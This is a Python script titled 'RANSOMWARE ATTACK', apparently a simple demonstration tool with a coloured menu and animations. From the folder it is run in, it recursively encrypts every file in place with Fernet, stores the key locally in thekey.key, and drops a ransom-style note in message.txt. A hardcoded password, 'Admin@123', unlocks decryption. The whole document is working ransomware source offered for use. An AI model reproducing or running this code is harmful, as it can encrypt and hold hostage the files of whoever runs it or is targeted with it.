import os
from cryptography.fernet import Fernet
from tqdm import tqdm
from art import *
import time
import sys

# ANSI escape codes for text colors
COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_MAGENTA = "\033[95m"
COLOR_CYAN = "\033[96m"
COLOR_RESET = "\033[0m"

print("\n")
# Animated title
title = "RANSOMWARE   \nATTACK   "
title_art = text2art(title, font="standard", chr_ignore=True)
title_lines = title_art.split("\n")
title_width = len(max(title_lines, key=len))
star_line = "*" * (title_width + 2)

fade_in_duration = 0.5  # Duration for the fade-in effect in seconds
fade_in_steps = 30  # Number of steps for the fade-in effect

for step in range(fade_in_steps):
    os.system('cls' if os.name == 'nt' else 'clear')  # Clears the screen

    print("\n" * 2)  # Clears the screen

    print(star_line)
    for line in title_lines:
        faded_line = line[:int(step / fade_in_steps * len(line))]
        print(f"*{COLOR_MAGENTA}{faded_line.center(title_width)}{COLOR_RESET}*")  # Red color for the title
    print(star_line)

    time.sleep(fade_in_duration / fade_in_steps)

time.sleep(0.5)  # Pause for half a second

# Function to display loading animation
def loading_animation():
    animation = "|/-\\"
    for i in range(10):
        time.sleep(0.1)
        sys.stdout.write("\r" + COLOR_CYAN + "Processing... " + animation[i % len(animation)] + COLOR_RESET)  # Cyan color for the loading animation
        sys.stdout.flush()

# Function to encrypt the files
def encrypt_files():
    files = []

    # Find and add files from all folders in the current directory
    for root, dirs, filenames in os.walk('.'):
        for file in filenames:
            if file == "ransomware.py" or file == "thekey.key" or file == "ransomware.exe" or file == "message.txt" or file == "ransomware-whole-system.py" or file == "ransomware-whole-system.exe":
                continue
            full_path = os.path.join(root, file)
            files.append(full_path)

    print(COLOR_YELLOW + "Encrypting files:" + COLOR_RESET)  # Yellow color for the message
    loading_animation()  # Call the loading animation
    with tqdm(total=len(files)) as pbar:
        key = Fernet.generate_key()

        with open("thekey.key", "wb") as thekey:
            thekey.write(key)

        for file in files:
            try:
                with open(file, "rb") as thefile:
                    contents = thefile.read()
                contents_encrypted = Fernet(key).encrypt(contents)
                with open(file, "wb") as thefile:
                    thefile.write(contents_encrypted)
                pbar.set_description(f"Encrypting {file}")
                time.sleep(0.1)
                pbar.update(1)
            except (PermissionError, FileNotFoundError) as e:
                print(f"{COLOR_RED} Failed to encrypt {file}: {str(e)}{COLOR_RESET}")

    # Create a new file and leave a message in it
    message_file = "message.txt"  # Specify the filename for the message
    message = "This is an important message!\nYour files have been encrypted!"

    try:
        with open(message_file, "w") as file:
            file.write(message)
    except (PermissionError, FileNotFoundError) as e:
        print(f"{COLOR_RED}\nFailed to create message file: {str(e)}{COLOR_RESET}")

    print(COLOR_GREEN + "\nAll of your files have been encrypted, and a message has been left in '{}'".format(message_file) + COLOR_RESET)


# Function to decrypt the files
def decrypt_files():
    files = []

    # Find and add files from all folders in the current directory
    for root, dirs, filenames in os.walk('.'):
        for file in filenames:
            if file == "ransomware.py" or file == "thekey.key" or file == "ransomware.exe" or file == "message.txt" or file == "ransomware-whole-system.py" or file == "ransomware-whole-system.exe":
                continue
            full_path = os.path.join(root, file)
            files.append(full_path)

    print(COLOR_YELLOW + "Decrypting files:" + COLOR_RESET)  # Yellow color for the message
    loading_animation()  # Call the loading animation
    with tqdm(total=len(files)) as pbar:
        try:
            with open("thekey.key", "rb") as key_file:
                secretkey = key_file.read()
        except FileNotFoundError:
            print(COLOR_RED + "\nThe key file 'thekey.key' does not exist." + COLOR_RESET)
            return

        secretphrase = "Admin@123"

        user_phrase = input(COLOR_CYAN + "\nEnter the secret password to decrypt your files:\n" + COLOR_RESET)

        if user_phrase == secretphrase:
            for file in files:
                try:
                    with open(file, "rb") as thefile:
                        contents = thefile.read()
                    try:
                        contents_decrypted = Fernet(secretkey).decrypt(contents)
                    except Exception as e:
                        print(f"{COLOR_RED} Failed to decrypt {file}: {str(e)}{COLOR_RESET}")
                        continue
                    with open(file, "wb") as thefile:
                        thefile.write(contents_decrypted)
                    pbar.set_description(f"Decrypting {file}")
                    time.sleep(0.1)
                    pbar.update(1)
                except (PermissionError, FileNotFoundError) as e:
                    print(f"{COLOR_RED} Failed to decrypt {file}: {str(e)}{COLOR_RESET}")

            try:
                os.remove("message.txt")
            except FileNotFoundError:
                print(COLOR_RED + "\nThe file 'message.txt' does not exist or has already been deleted." + COLOR_RESET)
            
            try:
                os.remove("thekey.key")
            except FileNotFoundError:
                print(COLOR_RED + "\nThe key file 'thekey.key' does not exist or has already been deleted." + COLOR_RESET)
            
            print("\n" + COLOR_GREEN + "Congrats, your files are decrypted. Enjoy!!" + COLOR_RESET)  # Green color for the success message
        else:
            print(COLOR_RED + "\nSorry, wrong password." + COLOR_RESET)  # Red color for the error message


while True:
    print(COLOR_YELLOW + "\n\nPlease select an option from the list below:\n\n" + COLOR_RESET + COLOR_BLUE + "1. Do RANSOMWARE attack on all system files\n2. Decrypt the files\n3. Exit" + COLOR_RESET)
    print("\n\n")
    user_input = input(COLOR_YELLOW + "Enter your choice:\n" + COLOR_RESET)

    if user_input == str(1):
        encrypt_files()
    elif user_input == str(2):
        decrypt_files()
    elif user_input == str(3):
        exit()
    else:
        print("\n" + COLOR_RED + "Invalid input. Please enter a valid option." + COLOR_RESET)
